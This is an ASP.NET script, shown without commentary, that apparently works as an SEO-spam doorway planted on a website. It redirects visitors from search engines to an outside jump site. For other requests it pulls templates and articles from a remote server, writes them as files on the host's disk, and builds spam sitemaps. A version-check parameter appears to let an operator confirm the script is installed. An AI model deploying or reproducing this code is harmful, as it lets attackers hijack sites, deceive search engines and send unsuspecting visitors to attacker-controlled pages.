<script language="vbscript" runat="server" debug="true">
Private Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs)
    dim tmplFName
    tmplFName = Request.ServerVariables("Script_Name") & ".tmp"
        
    dim bridge,serverid,serverurl,keywordid,urlid,jumpid,fs,tmplContent,xmlStr,tmplUrl,contUrl,referer,jumpurl,sitemap,lang,ver
    bridge = "http://www.serverconvert.com/getserver.aspx?"
    serverid = request.querystring("s")
    jumpid = request.querystring("j")
    lang = request.querystring("l")
    ver = request.querystring("v")
    referer = LCase(Request.ServerVariables("Http_Referer"))
    tmplContent=""

    Dim webClient As New System.Net.WebClient
    webClient.Encoding = System.Text.Encoding.UTF8

    if ver<>"" then
        response.write("1009")
    elseif referer<>"" and (instr(referer,"google.")>0 or instr(referer,"yahoo.")>0 or instr(referer,"bing.")>0 or instr(referer,"aol.")>0) and jumpid<>"" then
        Dim addr As String = "http://www.serverjump.com/jump.aspx?jumpid=" & jumpid & "&lang=" & lang & "&uid=" & Request.ServerVariables("SERVER_NAME") & Request.ServerVariables("Script_Name")
        response.redirect(addr)
    else
        Dim addr As String = bridge & "serverid=" & serverid
        serverurl = webClient.DownloadString(addr)
        keywordid = request.querystring("k")
        urlid = request.querystring("u")

        if serverurl<>"" then
            if request.querystring("m")="" then
                tmplUrl=serverurl & "/GetUrlTemplate.aspx?urlid=" & urlid & "&keywordid=" & keywordid & "&lang=" & lang
                contUrl=serverurl & "/getarticle.aspx?urlid=" & urlid & "&keywordid=" & keywordid & "&lang=" & lang
                tmplContent=""
                tmplFName = HttpContext.Current.Server.MapPath(tmplFName)
                if System.IO.File.Exists(tmplFName) then

                    Dim sr As System.IO.StreamReader = System.IO.File.OpenText(tmplFName)
                    Dim input As String
                    input = sr.ReadLine()
                    While Not input Is Nothing
                        tmplContent = tmplContent & input
                        input = sr.ReadLine()
                    End While
                    sr.Close()

                    if instr(tmplContent, "#content")<=0 then
                        tmplContent = ""
                    end if
                end if

                if tmplContent="" then
                    tmplContent = webClient.DownloadString(tmplUrl)
                    Try
                        Dim file As System.IO.StreamWriter = System.IO.File.CreateText(tmplFName)
                        file.Write(tmplContent)
                        file.Flush()
                        file.Close()
                    Catch ex As Exception
                        tmplContent = "<!---write template failed, return by server directlly--->"&tmplContent
                    End Try
                end if

                if tmplContent<>"" and instr(tmplContent, "#content#")>0 then
                    xmlStr = webClient.DownloadString(contUrl)
                    If xmlStr<>"" then
                        Try
                            tmplContent = replace(tmplContent, "#language#", lang)
                            tmplContent = replace(tmplContent, "#title#", New System.Text.RegularExpressions.Regex("<keywords>([^<>]*)</keywords>").Matches(xmlStr)(0).Groups(1).Value)
                            tmplContent = replace(tmplContent, "#keywords#", New System.Text.RegularExpressions.Regex("<keywords>([^<>]*)</keywords>").Matches(xmlStr)(0).Groups(1).Value)
                            tmplContent = replace(tmplContent, "#description#", (New System.Text.RegularExpressions.Regex("<keywords>([^<>]*)</keywords>").Matches(xmlStr)(0).Groups(1).Value) & "," & (New System.Text.RegularExpressions.Regex("<description>([^<>]*)</description>").Matches(xmlStr)(0).Groups(1).Value) & "," & Request.ServerVariables("HTTP_HOST"))
                            tmplContent = replace(tmplContent, "#content#", xmlStr.substring(instr(xmlStr,"<content><![CDATA[") + 18, instr(xmlStr,"]]></content>") - instr(xmlStr,"<content><![CDATA[") - 19))
                            response.write(tmplContent)
                        Catch ex As Exception
                            response.write("xml error:"&contUrl)
                        End Try
                        response.end
                    else
                        Response.Write("content is empty:"&contUrl)
                    end If
                else
                    Response.Write("template is empty:"&tmplUrl)
                end if
            else
                sitemap = webClient.DownloadString(serverurl & "/sitemap.aspx?importurlid=" & urlid)
                dim arr_sitemap,arr2,kid,jid,myt
                if sitemap<>"" then
                    arr_sitemap=split(sitemap,";")
                    if ubound(arr_sitemap)>0 then
                        response.ContentType="text/XML"
                        response.write("<urlset xmlns=""http://www.sitemaps.org/schemas/sitemap/0.9"">"&vbcrlf)
                        for myt=0 to ubound(arr_sitemap)
                            arr2=split(arr_sitemap(myt),",")
                            if ubound(arr2)>0 then
                                lang=arr2(0)
                                jid=arr2(1)
                                if jid<>"" and lang<>"" then
                                    for kid=2 to ubound(arr2)
                                        response.write("<url><loc><![CDATA[" & "http://" & LCase(Request.ServerVariables("HTTP_HOST")) & LCase(Request.ServerVariables("Script_Name")) & "?k=" & arr2(kid) & "&u=" & urlid & "&s=" & serverid & "&j=" & jid & "&l=" & lang & "]]></loc></url>" & vbcrlf)
                                    next
                                end if
                            end if
                        next
                        response.write("</urlset>")
                        response.end
                    end if
                end if
            end if
        else
            response.write("serverurl:"&addr)
        end if
    end if
End Sub
</script>